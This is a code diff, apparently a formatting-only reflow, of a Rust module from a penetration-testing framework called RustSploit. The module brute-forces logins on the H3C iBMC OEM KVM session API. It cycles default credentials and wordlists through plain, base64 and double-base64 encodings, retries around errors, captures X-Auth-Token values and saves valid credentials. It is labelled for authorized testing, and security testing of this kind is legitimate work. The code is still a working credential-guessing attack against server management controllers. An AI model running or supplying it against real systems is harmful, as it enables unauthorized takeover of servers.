@@ -28,19 +28,16 @@
 //!
 //! FOR AUTHORIZED TESTING ONLY.
 
-use anyhow::{ anyhow, Context, Result };
+use anyhow::{Context, Result, anyhow};
 use base64::Engine;
 use colored::*;
 use std::time::Duration;
 
-use crate::module::{ Finding, FindingKind, ModuleCtx, ModuleOutcome };
-use crate::module_info::{ ModuleInfo, ModuleRank };
-use crate::utils::network::{ build_http_client_with, HttpClientOpts };
+use crate::module::{Finding, FindingKind, ModuleCtx, ModuleOutcome};
+use crate::module_info::{ModuleInfo, ModuleRank};
+use crate::utils::network::{HttpClientOpts, build_http_client_with};
 use crate::utils::{
-    cfg_prompt_default,
-    cfg_prompt_existing_file,
-    cfg_prompt_int_range,
-    cfg_prompt_yes_no,
+    cfg_prompt_default, cfg_prompt_existing_file, cfg_prompt_int_range, cfg_prompt_yes_no,
     normalize_target,
 };
 
@@ -112,13 +109,35 @@ enum AttemptResult {
 }
 
 fn display_banner() {
-    if crate::utils::is_batch_mode() { return; }
-    crate::mprintln!("{}", "╔══════════════════════════════════════════════════════════════╗".red());
-    crate::mprintln!("{}", "║   H3C iBMC OEM KVM Session Brute Force                       ║".red().bold());
-    crate::mprintln!("{}", "║   POST /api/oem_kvm/session — no rate limit on default builds║".red());
-    crate::mprintln!("{}", "║   Tries plain / base64 / double-base64 credential encodings  ║".red());
-    crate::mprintln!("{}", "║   FOR AUTHORIZED TESTING ONLY                                ║".red());
-    crate::mprintln!("{}", "╚══════════════════════════════════════════════════════════════╝".red());
+    if crate::utils::is_batch_mode() {
+        return;
+    }
+    crate::mprintln!(
+        "{}",
+        "╔══════════════════════════════════════════════════════════════╗".red()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   H3C iBMC OEM KVM Session Brute Force                       ║"
+            .red()
+            .bold()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   POST /api/oem_kvm/session — no rate limit on default builds║".red()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   Tries plain / base64 / double-base64 credential encodings  ║".red()
+    );
+    crate::mprintln!(
+        "{}",
+        "║   FOR AUTHORIZED TESTING ONLY                                ║".red()
+    );
+    crate::mprintln!(
+        "{}",
+        "╚══════════════════════════════════════════════════════════════╝".red()
+    );
     crate::mprintln!();
 }
 
@@ -134,7 +153,8 @@ pub fn info() -> ModuleInfo {
             .to_string(),
         authors: vec!["RustSploit Contributors".to_string()],
         references: vec![
-            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/".to_string(),
+            "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"
+                .to_string(),
             "https://cwe.mitre.org/data/definitions/307.html".to_string(),
         ],
         disclosure_date: None,
@@ -159,26 +179,53 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
         normalized
     };
 
-    let port = cfg_prompt_int_range("port", "Target port", DEFAULT_PORT as i64, 1, 65535).await? as u16;
+    let port =
+        cfg_prompt_int_range("port", "Target port", DEFAULT_PORT as i64, 1, 65535).await? as u16;
     let path = cfg_prompt_default("path", "API path", DEFAULT_PATH).await?;
-    let timeout_secs = cfg_prompt_int_range("timeout", "Per-attempt timeout (seconds)", DEFAULT_TIMEOUT_SECS as i64, 1, 60).await? as u64;
-    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try the built-in default credential list?", true).await?;
-    let load_user_wordlist = cfg_prompt_yes_no("user_wordlist", "Load a username wordlist?", false).await?;
+    let timeout_secs = cfg_prompt_int_range(
+        "timeout",
+        "Per-attempt timeout (seconds)",
+        DEFAULT_TIMEOUT_SECS as i64,
+        1,
+        60,
+    )
+    .await? as u64;
+    let use_defaults = cfg_prompt_yes_no(
+        "use_defaults",
+        "Try the built-in default credential list?",
+        true,
+    )
+    .await?;
+    let load_user_wordlist =
+        cfg_prompt_yes_no("user_wordlist", "Load a username wordlist?", false).await?;
     let user_path = if load_user_wordlist {
         Some(cfg_prompt_existing_file("userlist", "Path to username wordlist").await?)
-    } else { None };
-    let load_pass_wordlist = cfg_prompt_yes_no("pass_wordlist", "Load a password wordlist?", false).await?;
+    } else {
+        None
+    };
+    let load_pass_wordlist =
+        cfg_prompt_yes_no("pass_wordlist", "Load a password wordlist?", false).await?;
     let pass_path = if load_pass_wordlist {
         Some(cfg_prompt_existing_file("passlist", "Path to password wordlist").await?)
-    } else { None };
-    let try_all_encodings = cfg_prompt_yes_no("try_all_encodings", "Try plain + base64 + double-base64 for each pair?", true).await?;
-    let stop_on_hit = cfg_prompt_yes_no("stop_on_hit", "Stop on first valid credential?", true).await?;
+    } else {
+        None
+    };
+    let try_all_encodings = cfg_prompt_yes_no(
+        "try_all_encodings",
+        "Try plain + base64 + double-base64 for each pair?",
+        true,
+    )
+    .await?;
+    let stop_on_hit =
+        cfg_prompt_yes_no("stop_on_hit", "Stop on first valid credential?", true).await?;
     let verbose = cfg_prompt_yes_no("verbose", "Verbose (log each attempt)", false).await?;
 
     // Build the candidate list.
     let mut pairs: Vec<(String, String)> = Vec::new();
     if use_defaults {
-        for (u, p) in DEFAULT_CREDS { pairs.push((u.to_string(), p.to_string())); }
+        for (u, p) in DEFAULT_CREDS {
+            pairs.push((u.to_string(), p.to_string()));
+        }
     }
     if let (Some(ufile), Some(pfile)) = (user_path.as_ref(), pass_path.as_ref()) {
         let users = read_lines(ufile).await?;
@@ -211,7 +258,9 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     }
 
     if pairs.is_empty() {
-        return Err(anyhow!("no candidate credentials configured — pick at least defaults or a wordlist"));
+        return Err(anyhow!(
+            "no candidate credentials configured — pick at least defaults or a wordlist"
+        ));
     }
 
     let encodings: Vec<Encoding> = if try_all_encodings {
@@ -224,12 +273,21 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     let client = build_http_client_with(
         Duration::from_secs(timeout_secs),
         HttpClientOpts::permissive_unconditional(),
-    ).context("Failed to build HTTP client")?;
+    )
+    .context("Failed to build HTTP client")?;
 
-    crate::mprintln!("{}", format!(
-        "[*] Target: https://{}{}  ({} pair(s) × {} encoding(s) = {} attempts)",
-        host, path, pairs.len(), encodings.len(), pairs.len() * encodings.len(),
-    ).cyan());
+    crate::mprintln!(
+        "{}",
+        format!(
+            "[*] Target: https://{}{}  ({} pair(s) × {} encoding(s) = {} attempts)",
+            host,
+            path,
+            pairs.len(),
+            encodings.len(),
+            pairs.len() * encodings.len(),
+        )
+        .cyan()
+    );
 
     // How many times to re-attempt a single (user, pass, encoding) when the
     // endpoint returns a transient transport error before giving up on that
@@ -240,23 +298,36 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     let mut tried = 0u64;
     'outer: for (user, pass) in &pairs {
         for enc in &encodings {
-            if ctx.is_cancelled() { break 'outer; }
+            if ctx.is_cancelled() {
+                break 'outer;
+            }
             tried += 1;
 
             // Retry transient transport errors with exponential backoff so a
             // network blip never masquerades as a denied credential.
             let mut attempt = 0u32;
             let result = loop {
-                if ctx.is_cancelled() { break 'outer; }
+                if ctx.is_cancelled() {
+                    break 'outer;
+                }
                 ctx.rate_limit(target).await;
                 match try_login(&client, &host, &path, user, pass, *enc).await {
                     AttemptResult::Transient(msg) if attempt < MAX_TRANSIENT_RETRIES => {
                         attempt += 1;
                         if verbose {
-                            crate::mprintln!("{}", format!(
-                                "[~] {}:{} ({}) transient error ({}); retry {}/{}",
-                                user, pass, enc.label(), msg, attempt, MAX_TRANSIENT_RETRIES
-                            ).dimmed());
+                            crate::mprintln!(
+                                "{}",
+                                format!(
+                                    "[~] {}:{} ({}) transient error ({}); retry {}/{}",
+                                    user,
+                                    pass,
+                                    enc.label(),
+                                    msg,
+                                    attempt,
+                                    MAX_TRANSIENT_RETRIES
+                                )
+                                .dimmed()
+                            );
                         }
                         let backoff = Duration::from_millis(250u64 * (1u64 << (attempt - 1)));
                         tokio::time::sleep(backoff).await;
@@ -268,19 +339,42 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
 
             match result {
                 AttemptResult::Hit(token) => {
-                    crate::mprintln!("{}", format!(
-                        "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
-                        user, pass, enc.label(), token
-                    ).green().bold());
+                    crate::mprintln!(
+                        "{}",
+                        format!(
+                            "[+] HIT: {}:{} ({}) -> X-Auth-Token={}",
+                            user,
+                            pass,
+                            enc.label(),
+                            token
+                        )
+                        .green()
+                        .bold()
+                    );
                     if crate::cred_store::store_credential(crate::cred_store::NewCred {
-                        host: &host, port, service: "https", username: user, secret: pass,
+                        host: &host,
+                        port,
+                        service: "https",
+                        username: user,
+                        secret: pass,
                         cred_type: crate::cred_store::CredType::Password,
                         source_module: "creds/generic/h3c_oem_kvm_bruteforce",
-                    }).await.is_none() { eprintln!("[!] Failed to store credential"); }
+                    })
+                    .await
+                    .is_none()
+                    {
+                        crate::meprintln!("[!] Failed to store credential");
+                    }
                     outcome.findings.push(Finding {
                         target: target.to_string(),
                         kind: FindingKind::Credential,
-                        message: format!("H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}", user, pass, enc.label(), host),
+                        message: format!(
+                            "H3C iBMC OEM KVM credentials valid {}:{} ({}) on {}",
+                            user,
+                            pass,
+                            enc.label(),
+                            host
+                        ),
                         data: Some(serde_json::json!({
                             "service": "https",
                             "port": port,
@@ -291,23 +385,34 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
                         })),
                     });
                     found.push((user.clone(), pass.clone(), *enc, token));
-                    if stop_on_hit { break 'outer; }
+                    if stop_on_hit {
+                        break 'outer;
+                    }
                 }
                 AttemptResult::Denied => {
                     if verbose {
-                        crate::mprintln!("{}", format!(
-                            "[-] {}:{} ({}) — denied", user, pass, enc.label()
-                        ).dimmed());
+                        crate::mprintln!(
+                            "{}",
+                            format!("[-] {}:{} ({}) — denied", user, pass, enc.label()).dimmed()
+                        );
                     }
                 }
                 AttemptResult::Transient(msg) => {
                     // Exhausted retries: surface as a Note so the operator
                     // knows this pair was NOT actually tested (vs. denied),
                     // and never treat it as a clean negative.
-                    crate::mprintln!("{}", format!(
-                        "[!] {}:{} ({}) — untested after {} transient error(s): {}",
-                        user, pass, enc.label(), MAX_TRANSIENT_RETRIES, msg
-                    ).yellow());
+                    crate::mprintln!(
+                        "{}",
+                        format!(
+                            "[!] {}:{} ({}) — untested after {} transient error(s): {}",
+                            user,
+                            pass,
+                            enc.label(),
+                            MAX_TRANSIENT_RETRIES,
+                            msg
+                        )
+                        .yellow()
+                    );
                     outcome.findings.push(Finding {
                         target: target.to_string(),
                         kind: FindingKind::Note,
@@ -331,10 +436,16 @@ pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
     }
 
     crate::mprintln!();
-    crate::mprintln!("{}", format!(
-        "[*] {} attempts; {} valid credential(s)",
-        tried, found.len()
-    ).cyan().bold());
+    crate::mprintln!(
+        "{}",
+        format!(
+            "[*] {} attempts; {} valid credential(s)",
+            tried,
+            found.len()
+        )
+        .cyan()
+        .bold()
+    );
 
     if found.is_empty() {
         crate::mprintln!("{}", "[-] No valid credentials found.".yellow());
@@ -371,7 +482,9 @@ async fn try_login(
     };
     let status = resp.status();
     if status.as_u16() == 429 {
-        if let Some(retry) = resp.headers().get("Retry-After")
+        if let Some(retry) = resp
+            .headers()
+            .get("Retry-After")
             .and_then(|v| v.to_str().ok())
             .and_then(|v| v.parse::<u64>().ok())
         {
@@ -398,7 +511,12 @@ async fn try_login(
         }
         _ => None,
     };
-    let body = match crate::utils::network::read_http_body_text_capped(resp, crate::utils::safe_io::DEFAULT_BODY_CAP).await {
+    let body = match crate::utils::network::read_http_body_text_capped(
+        resp,
+        crate::utils::safe_io::DEFAULT_BODY_CAP,
+    )
+    .await
+    {
         Ok(b) => b,
         // Body read failed mid-stream: transient, not a denial.
         Err(e) => return AttemptResult::Transient(format!("read body: {e}")),
@@ -423,21 +541,28 @@ fn extract_token(body: &str) -> Option<String> {
     while value_start < bytes.len() && bytes[value_start].is_ascii_whitespace() {
         value_start += 1;
     }
-    if value_start >= bytes.len() { return None; }
+    if value_start >= bytes.len() {
+        return None;
+    }
     let rest = &after[value_start..];
     if let Some(stripped) = rest.strip_prefix('"') {
         let val: String = stripped.chars().take_while(|c| *c != '"').collect();
         if val.is_empty() { None } else { Some(val) }
     } else {
-        let val: String = rest.chars().take_while(|c| !c.is_whitespace() && *c != ',' && *c != '}').collect();
+        let val: String = rest
+            .chars()
+            .take_while(|c| !c.is_whitespace() && *c != ',' && *c != '}')
+            .collect();
         if val.is_empty() { None } else { Some(val) }
     }
 }
 
 async fn read_lines(path: &str) -> Result<Vec<String>> {
-    let content = tokio::fs::read_to_string(path).await
+    let content = tokio::fs::read_to_string(path)
+        .await
         .with_context(|| format!("read {}", path))?;
-    Ok(content.lines()
+    Ok(content
+        .lines()
         .map(|l| l.trim().to_string())
         .filter(|l| !l.is_empty() && !l.starts_with('#'))
         .collect())
@@ -451,9 +576,17 @@ fn strip_scheme(host: &str) -> String {
             break;
         }
     }
-    if let Some(slash) = t.find('/') { t.truncate(slash); }
-    if let Some(colon) = t.find(':') { t.truncate(colon); }
+    if let Some(slash) = t.find('/') {
+        t.truncate(slash);
+    }
+    if let Some(colon) = t.find(':') {
+        t.truncate(colon);
+    }
     t
 }
 
-crate::register_native_module!(crate::module::Category::Creds, "generic/h3c_oem_kvm_bruteforce", native);
+crate::register_native_module!(
+    crate::module::Category::Creds,
+    "generic/h3c_oem_kvm_bruteforce",
+    native
+);
